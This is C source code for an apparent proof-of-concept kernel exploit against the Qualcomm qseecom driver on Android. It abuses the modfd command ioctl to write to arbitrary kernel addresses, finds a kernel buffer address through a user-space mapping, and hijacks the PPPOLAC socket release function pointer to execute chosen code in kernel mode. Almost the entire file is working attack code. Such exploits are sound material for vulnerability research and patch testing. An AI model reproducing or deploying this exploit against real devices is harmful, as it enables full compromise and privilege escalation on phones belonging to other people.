#include <fcntl.h>
#include <errno.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include "ion.h"
#include "qseecom.h"
#include "symbols.h"

#define O_DSYNC	(00010000)

/**
 * The virtual address at which the dropzone to which the kernel writes the initial data is allocated.
 */
#define START_MAP_ADDRESS (0x10000000)

/**
 * The size of the dropzone, in bytes.
 * NOTE: This is only the size *reserved*, but definitely not the size allocated.
 */
#define USER_MAPPING_SIZE (0x80000000)

/**
 * The minimal assumed kernel virtual address.
 */
#define KERNEL_BASE (0xC0000000)

/**
 * The value of the initial offset which is used to determine the address of the sb_virt buffer in kernel space.
 */
#define INITIAL_OVERWRITE_OFFSET ((uint32_t)(((uint64_t)0xFFFFFFFF + (uint64_t)1 + (uint64_t)START_MAP_ADDRESS) - (uint64_t)KERNEL_BASE))

/**
 * The filler byte which is used to fill the beginning of the user mapping, in order to detect changes.
 */
#define FILLER_BYTE (0xAA)

/**
 * The size of the area in the dropzone which is searched for modification.
 */
#define POTENTIAL_OVERWRITE_RANGE (0x30000000)

/**
 * The PPPOLAC protocol number (missing in the socket.h header)
 */
#define PX_PROTO_OLAC (3)

/**
 * The pointer to the function stub which is executed whenever a PPPOLAC
 * socket is closed. This stub contains a short piece of ARM code which jumps
 * to the given address, like so:
 *  LDR PC, addr
 * addr:
 *  DCD <ADDRESS>
 */
uint32_t* g_stub_address = NULL;

/**
 * Overwrites the data at destination address (incl. kernel space) with data written
 * by the modfd kernel function.
 * @param fd The FD of the qseecom driver.
 * @param ion_fd The ION buffer allocated.
 * @param dest_address The destination address.
 * @param sb_virt_address The virtual address of the sb_virt buffer in kernel space.
 */
int overwrite_address(int fd,
					  int ion_fd,
					  void* dest_address,
					  void* sb_virt_address) {
	
	struct qseecom_send_modfd_cmd_req req;
	memset(&req, 0, sizeof(req));
	req.cmd_req_buf = (void*)(START_MAP_ADDRESS + USER_MAPPING_SIZE - sizeof(uint32_t));
	req.cmd_req_len = USER_MAPPING_SIZE - sizeof(uint32_t);
	req.resp_buf = (void*)START_MAP_ADDRESS;
	req.resp_len = sizeof(uint32_t);
	req.ifd_data[0].fd = ion_fd;
	req.ifd_data[0].cmd_buf_offset = (uint32_t)dest_address - (USER_MAPPING_SIZE - sizeof(uint32_t)) - (uint32_t)sb_virt_address;
	return ioctl(fd, QSEECOM_IOCTL_SEND_MODFD_CMD_REQ, &req);
}

/**
 * Overwrites the data at the given positive offset from sb_virt with
 * data written by the modfd kernel function.
 * @param fd The FD of the qseecom driver.
 * @param ion_fd The ION buffer allocated.
 * @param offset The offset from sb_virt at which to write.
 */
int overwrite_positive_offset(int fd,
							  int ion_fd,
							  uint32_t offset) {

	struct qseecom_send_modfd_cmd_req req;
	memset(&req, 0, sizeof(req));
	req.cmd_req_buf = (void*)(offset + START_MAP_ADDRESS);
	req.cmd_req_len = sizeof(uint32_t);
	req.resp_buf = (void*)START_MAP_ADDRESS;
	req.resp_len = sizeof(uint32_t);
	req.ifd_data[0].fd = ion_fd;
	req.ifd_data[0].cmd_buf_offset = 0;
	return ioctl(fd, QSEECOM_IOCTL_SEND_MODFD_CMD_REQ, &req);
}

/**
 * Executes the given function in kernel space.
 * @param func The function which should be executed in kernel space.
 * @return 0 if successful, a negative linux error code otherwise.
 */
int execute_in_kernel(void(*func)(void)) {

	//Writing to the function stub
	g_stub_address[0] = 0xE51FF004; //LDR PC, [addr]
	//addr:
	g_stub_address[1] = (uint32_t)func;

	//Flushing the cache (to make sure the I-cache doesn't contain leftovers)
	cacheflush((uint32_t)g_stub_address & (~0xFFF), 0x1000, 0);

	//Opening and closing a PPPOLAC socket
	int sock = socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OLAC);
	if (sock < 0) {
		perror("[-] Failed to open PPPOLAC socket\n");
		return -errno;
	}
	printf("[+] Opened PPPOLAC socket: %d\n", sock);
	close(sock);
	printf("[+] Executed function\n");
	return 0;
}

/**
 * Does the neccessary preparations to enable kernel code execution.
 */
int enable_kernel_code_exec() {

	//Opening the device
	int fd = open("/dev/qseecom", O_RDONLY | O_DSYNC);
	if (fd < 0) {
		perror("[-] Failed to open /dev/qseecom");
		return -errno;
	}
	printf("[+] Opened qseecom driver\n");

	//Getting a ION mapped handle
	int ion_fd = open("/dev/ion", O_RDONLY);
	struct ion_allocation_data alloc_data;
	alloc_data.len = ION_ALLOC_SIZE;
	alloc_data.align = 4096;
	alloc_data.flags = 0;
	alloc_data.heap_mask= ION_HEAP(ION_QSECOM_HEAP_ID);
	alloc_data.handle = (void*)0;
	int res = ioctl(ion_fd, ION_IOC_ALLOC, &alloc_data);
	if (res < 0) {
			perror("[-] Failed to allocate ION memory");
			return -errno;
	}
	printf("[+] Allocated ION buffer\n");

	//Mapping the ION buffer to a FD
	struct ion_fd_data fd_data;
	fd_data.handle = alloc_data.handle;
	res = ioctl(ion_fd, ION_IOC_MAP, &fd_data);
	if (res < 0) {
			perror("[-] Failed to map ION allocation");
			return -errno;
	}
	printf("[+] Mapped ION FD: %d\n", fd_data.fd);

	//Mapping the ION FD to a virtual address
	void* ion_va = mmap(NULL, ION_ALLOC_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd_data.fd, 0);
	if (ion_va == NULL) {
		perror("[-] Failed to map ION buffer");
		return -errno;
	}
	printf("[+] Mapped ION buffer to: %p\n", ion_va);
	memset(ion_va, '\0', ION_ALLOC_SIZE);

	//Mapping a large dropzone for the kernel overwrites
	void* dropzone = mmap((void*)START_MAP_ADDRESS, USER_MAPPING_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
	if (dropzone == NULL) {
		perror("[-] Failed to map dropzone\n");
		return -errno;
	}
	printf("[+] Successfully mapped dropzone. Address: %p, Size: 0x%08X\n", (void*)START_MAP_ADDRESS, USER_MAPPING_SIZE);

	//Overwriting only a small portion of this mapped buffer, because until it is written
	//to it is only reserved, but not allocated.
	memset(dropzone, FILLER_BYTE, POTENTIAL_OVERWRITE_RANGE);

	//Requesting to set the buffer sizes for qseecom using our mapped area
	struct qseecom_set_sb_mem_param_req mem_req;
	mem_req.ifd_data_fd = fd_data.fd;
	mem_req.sb_len = USER_MAPPING_SIZE;
	mem_req.virt_sb_base = START_MAP_ADDRESS;
	res = ioctl(fd, QSEECOM_IOCTL_SET_MEM_PARAM_REQ, &mem_req);
	if (res < 0) {
			perror("[-] Failed to set QSEECOM memory params");
			return -errno;
	}
	printf("[+] Set QSEECOM memory params\n");

	//Querying a loaded app, to make sure we switch into XXX
	struct qseecom_qseos_app_load_query app_query;
	memset(&app_query, 0, sizeof(app_query));
	strcpy(app_query.app_name, "keymaster");
	res = ioctl(fd, QSEECOM_IOCTL_APP_LOADED_QUERY_REQ, &app_query);
	if (res < 0 && errno != EEXIST) {
		perror("[-] Failed to query loaded app");
		return -errno;
	}
	printf("[+] Successfully queried loaded app, app_id: %d\n", app_query.app_id);

	//Sending a modification request to the intial offset
	printf("[+] Sending modification request with offset: 0x%08X\n", INITIAL_OVERWRITE_OFFSET);
	overwrite_positive_offset(fd, fd_data.fd, INITIAL_OVERWRITE_OFFSET);

	//Looking for a modification in the buffer
	uint32_t modification = 0;
	void* modification_address = NULL;
	int i;
	for (i=0; i<POTENTIAL_OVERWRITE_RANGE; i++) {
		if (((char*)dropzone)[i] != FILLER_BYTE) {
			modification_address = (void*)((uint32_t)dropzone + i);
			modification = *((uint32_t*)modification_address);
			printf("[+] Found modification: 0x%08X at offset: %d (address: %p)\n", modification, i, modification_address);
			break;
		}
	}
	if (modification_address == NULL) {
		printf("[-] Failed to find modification, aborting\n");
		return -ENOENT;
	}

	//Calculating the address of sb_virt
	void* sb_virt_address = (void*)((uint64_t)0xFFFFFFFF + 1 + (uint64_t)modification_address - (uint64_t)INITIAL_OVERWRITE_OFFSET);
	printf("[+] sb_virt: %p\n", sb_virt_address);

	//Allocating the function stub at the modification address
	g_stub_address = (uint32_t*)mmap((void*)modification, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
	if (g_stub_address == NULL) {
		perror("[-] Failed to allocate function stub");
		return -errno;
	}
	printf("[+] Allocated function stub\n");

	//Now, trying to overwrite the PPPOLAC release pointer to achieve code execution
	overwrite_address(fd, fd_data.fd, (void*)PPPOLAC_PROTO_OPS_RELEASE, sb_virt_address);

	//Now we can close the FDs safely
	close(fd);
	close(fd_data.fd);

	return 0;
}

